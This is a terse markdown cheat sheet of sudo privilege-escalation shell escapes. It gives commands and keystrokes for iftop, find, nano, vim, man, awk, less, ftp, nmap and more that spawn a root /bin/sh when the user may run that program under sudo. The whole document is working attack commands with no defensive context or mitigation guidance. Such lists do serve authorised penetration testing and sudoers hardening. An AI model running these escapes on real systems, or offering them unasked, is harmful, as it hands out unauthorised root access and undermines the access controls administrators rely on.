### View
```
sudo -l
```
### Using iftop
```
sudo iftop
press !
>sh (Enter)
```
### Using Find
```
$ sudo find . -exec /bin/sh \; -quit
```
### Using Nano 
```
$ sudo nano
Press Ctrl + R and then Ctrl + X
When prompted for the command to execute- reset; sh 1>&0 2>&0
```
### Using Vim
```
$ sudo vim -c ':!/bin/sh'
```
### Using man
```
$ sudo man man
Trigger the escape by simply typing: !sh and pressing Enter
```
### Using awk
```
$ sudo awk 'BEGIN {system("/bin/sh")}'
```
### Using Less
```
$ sudo less /etc/bash.bashrc
Trigger the shell escape: type !/bin/sh and press Enter
```
### Using ftp
```
$ sudo ftp
At the ftp> prompt, type: !/bin/sh
```
### Using nmap
```
$ sudo nmap --interactive
At the nmap> prompt, type: !/bin/sh
```
### Using more
```
$ sudo more /var/log/syslog
(Note: The file must be long enough to trigger the interactive prompt)
Type: !/bin/sh and press Enter
```
